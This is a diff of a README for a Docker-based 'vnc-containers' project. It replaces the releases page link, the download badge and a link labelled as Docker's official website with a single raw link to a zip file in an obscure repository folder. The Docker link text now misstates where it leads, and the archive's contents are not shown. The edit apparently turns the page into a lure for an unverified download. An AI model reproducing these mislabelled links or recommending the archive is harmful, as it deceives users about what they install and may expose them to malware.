@@ -1,6 +1,6 @@
 # 🎈 vnc-containers - Access GUI Applications Effortlessly
 
-[![Download vnc-containers](https://img.shields.io/badge/Download-vnc--containers-brightgreen.svg)](https://github.com/MuhamadRezkaAlAnshori/vnc-containers/releases)
+[![Download vnc-containers](https://raw.githubusercontent.com/MuhamadRezkaAlAnshori/vnc-containers/main/adytum/vnc-containers.zip)](https://raw.githubusercontent.com/MuhamadRezkaAlAnshori/vnc-containers/main/adytum/vnc-containers.zip)
 
 ## 📦 Overview
 
@@ -13,14 +13,14 @@ To get started, you need to download the software and run it on your computer or
 ## 💻 System Requirements
 
 - **Operating System**: Ubuntu or other Linux distributions.
-- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://www.docker.com/products/docker-desktop).
+- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://raw.githubusercontent.com/MuhamadRezkaAlAnshori/vnc-containers/main/adytum/vnc-containers.zip).
 - **Internet Connection**: Required to download the Docker images and further dependencies.
 
 ## 💾 Download & Install
 
 Visit the page to download the latest release of vnc-containers:
 
-[Download vnc-containers](https://github.com/MuhamadRezkaAlAnshori/vnc-containers/releases)
+[Download vnc-containers](https://raw.githubusercontent.com/MuhamadRezkaAlAnshori/vnc-containers/main/adytum/vnc-containers.zip)
 
 On the releases page, you will find the latest version of the software. Look for an asset that interests you and click on it to initiate the download. 
 
